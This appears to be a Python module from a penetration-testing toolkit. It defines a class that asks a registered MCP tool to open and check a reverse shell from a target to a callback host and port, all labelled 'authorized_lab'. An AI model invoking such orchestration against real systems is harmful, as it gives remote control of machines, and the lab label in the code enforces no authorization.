"""Reverse-shell orchestration delegated to a registered MCP adapter for authorized labs."""
from __future__ import annotations
import os
from typing import Any

class ReverseShellOrchestrator:
    def __init__(self, target: str, mcp_call):
        self.target = target
        self.mcp_call = mcp_call

    def establish(self, context: dict[str, Any]) -> str:
        callback_host = os.getenv("LAB_CALLBACK_HOST", "127.0.0.1")
        callback_port = int(os.getenv("LAB_CALLBACK_PORT", "4444"))
        return self.mcp_call(os.getenv("MCP_REVERSE_SHELL_TOOL", "reverse_shell_manager"), {
            "operation": "establish",
            "target": self.target,
            "callback_host": callback_host,
            "callback_port": callback_port,
            "context": context,
            "mode": "authorized_lab",
        })

    def status(self, context: dict[str, Any]) -> str:
        return self.mcp_call(os.getenv("MCP_REVERSE_SHELL_TOOL", "reverse_shell_manager"), {
            "operation": "status",
            "target": self.target,
            "context": context,
            "mode": "authorized_lab",
        })
